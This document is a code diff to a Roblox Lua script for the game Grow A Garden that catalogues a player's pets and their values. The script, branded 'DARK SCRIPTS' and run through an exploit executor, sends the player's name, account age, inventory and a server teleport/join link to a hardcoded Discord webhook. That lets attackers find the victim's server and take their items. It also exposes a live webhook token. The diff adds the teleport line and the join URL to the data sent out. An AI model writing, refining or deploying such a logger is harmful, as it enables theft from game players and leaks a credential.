@@ -1,9 +1,11 @@
-local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
 -- === CONFIG ===
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
 
--- Priority pets → emojis
+-- === PRIORITY PETS & VALUES ===
 local PRIORITY = {
     ["Raccoon"] = "🦝",
     ["Dragonfly"] = "🐉",
@@ -19,7 +21,6 @@ local PRIORITY = {
     ["T-Rex"] = "🦖"
 }
 
--- Priority pets → base values
 local PRIORITY_VALUES = {
     ["Raccoon"] = 250,
     ["Dragonfly"] = 50,
@@ -35,7 +36,7 @@ local PRIORITY_VALUES = {
     ["T-Rex"] = 35
 }
 
--- Allowed pets
+-- === PETS ===
 local PETS = {
     "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
     "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
@@ -74,99 +75,111 @@ local function getPriorityEmoji(name)
     return nil
 end
 
--- Collect pets from a container
+local function formatPetLine(name)
+    local emoji = getPriorityEmoji(name)
+    local baseValue = 0
+    for petName, petValue in pairs(PRIORITY_VALUES) do
+        if string.find(string.lower(name), string.lower(petName)) then
+            baseValue = petValue
+            break
+        end
+    end
+
+    -- Extract weight
+    local weight = 0
+    local kgMatch = string.match(name, "(%d+%.?%d*)%s*KG") or string.match(name, "(%d+%.?%d*)%s*kg")
+    if kgMatch then weight = tonumber(kgMatch) or 0 end
+
+    -- Extract age if present
+    local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
+    local ageText = ageMatch and ("[Age " .. ageMatch .. "]") or ""
+
+    -- Determine emoji for non-priority
+    if not emoji then
+        if weight >= 30 then
+            emoji = "💪"
+        else
+            emoji = "🐶"
+        end
+    end
+
+    return emoji .. " - " .. name .. " " .. ageText .. " → " .. baseValue .. "¢"
+end
+
 local function collectPets(container)
     local items = {}
-    if not container then return items, 0, 0 end
+    local hasPriorityPet = false
+    if not container then return {}, 0, false end
     for _, obj in ipairs(container:GetChildren()) do
         if obj:IsA("Tool") and isPet(obj.Name) then
             table.insert(items, obj.Name)
+            if getPriorityEmoji(obj.Name) then
+                hasPriorityPet = true
+            end
         end
     end
 
-    local priorityItems, normalItems = {}, {}
+    local formatted = {}
     local totalValue = 0
-
     for _, name in ipairs(items) do
-        local emoji = getPriorityEmoji(name)
-        local baseValue = 0
+        table.insert(formatted, formatPetLine(name))
         for petName, petValue in pairs(PRIORITY_VALUES) do
             if string.find(string.lower(name), string.lower(petName)) then
-                baseValue = petValue
+                totalValue = totalValue + petValue
                 break
             end
         end
-
-        local displayName = name
-        local value = baseValue
-
-        if emoji then
-            -- True priority pets
-            if baseValue >= 50 then
-                displayName = "Titanic " .. name
-                value = value + 2000
-            elseif baseValue >= 30 then
-                displayName = "Huge " .. name
-                value = value + 1000
-            end
-            table.insert(priorityItems, emoji .. " " .. displayName .. " (Value: " .. baseValue .. ")")
-        else
-            -- Non-priority pets: 30+kg show 💪 but no ping
-            if baseValue >= 30 then
-                displayName = "💪 " .. name
-            else
-                displayName = "🐶 " .. name
-            end
-            table.insert(normalItems, displayName)
-        end
-
-        totalValue = totalValue + value
     end
 
-    table.sort(priorityItems, function(a,b) return a:lower()<b:lower() end)
-    table.sort(normalItems, function(a,b) return a:lower()<b:lower() end)
-
-    local ordered = {}
-    for _,n in ipairs(priorityItems) do table.insert(ordered,n) end
-    for _,n in ipairs(normalItems) do table.insert(ordered,n) end
-
-    return ordered, #priorityItems > 0, totalValue
+    return formatted, totalValue, hasPriorityPet
 end
 
--- Collect pets from Backpack and Equipped
-local backpack, hasPriorityBackpack, backpackValue = collectPets(player:FindFirstChild("Backpack"))
-local equipped, hasPriorityEquipped, equippedValue = collectPets(player.Character)
-
+-- Collect pets
+local backpack, backpackValue, hasPriorityBackpack = collectPets(player:FindFirstChild("Backpack"))
+local equipped, equippedValue, hasPriorityEquipped = collectPets(player.Character)
 local totalValue = backpackValue + equippedValue
 
--- Build Discord embed
-local description = table.concat({
-    "Player Information",
-    "Name: " .. player.Name,
-    "Executor: Delta",
-    "Account Age: " .. player.AccountAge .. " days",
-    "",
-    "Total Value: 💰 " .. totalValue,
-    "",
-    "Backpack",
-    #backpack > 0 and table.concat(backpack, "\n") or "No pets found."
-}, "\n")
-
--- Only real priority pets trigger ping
+-- Ping if any priority pet exists
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
-local ping = hasPriority and "@everyone" or ""
+local pingText = hasPriority and "--@everyone\n" or ""
 
+-- Create teleport line
+local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
+
+-- Combine ping + teleport for webhook content
+local contentText = pingText .. teleportLine
+
+-- Generate dynamic join URL for embed
+local serverURL = string.format(
+    "https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",
+    game.PlaceId,
+    game.JobId
+)
+
+-- Build Discord embed
+local description = "```Name: " .. player.Name .. "\n" ..
+                    "Executor: Delta\n" ..
+                    "Account Age: " .. player.AccountAge .. " days```" .. "\n" ..
+                    "💰 Kwarta nga nakuha\n" ..
+                    "```" .. totalValue .. "₱```" .. "\n" ..
+                    "🎒 Backpack\n" ..
+                    "```" ..
+                    (#backpack > 0 and table.concat(backpack, "\n") or "No pets found.") ..
+                    "```" .. "\n" ..
+                    "🏝️ Join with URL\n" ..
+                    "**[" .. game.JobId .. "](" .. serverURL .. ")**"
+
+-- Send webhook
 local payload = {
-    content = ping,
+    content = contentText,
     embeds = {{
         title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
         description = description,
-        color = hasPriority and 15158332 or 3447003
+        color = 3447003
     }}
 }
 
-local json = game:GetService("HttpService"):JSONEncode(payload)
-
+local json = HttpService:JSONEncode(payload)
 local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
 if req then
     pcall(function()
